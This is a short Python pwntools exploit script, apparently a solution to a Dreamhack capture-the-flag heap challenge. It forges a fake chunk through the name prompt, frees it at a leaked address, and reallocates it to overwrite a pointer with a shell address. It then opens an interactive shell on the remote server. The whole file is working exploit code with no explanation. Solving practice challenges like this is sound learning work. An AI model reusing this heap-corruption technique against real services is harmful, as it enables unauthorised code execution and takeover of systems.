from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 24176
r = remote(HOST, PORT)

def create(size, data):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', str(size).encode())
    r.sendlineafter(b': ', data)

def delete(addr):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', str(addr).encode())

sh=0x400940

payload = flat([
    0x100,
    0x101,
    0x41,
])

r.sendlineafter(b'name: ', payload)
addr = int(r.recvuntil(b':').strip(b':').decode(),16)
delete(addr+0x10)
create(0x100-0x10, b'A'*0x28+p64(sh))


r.interactive()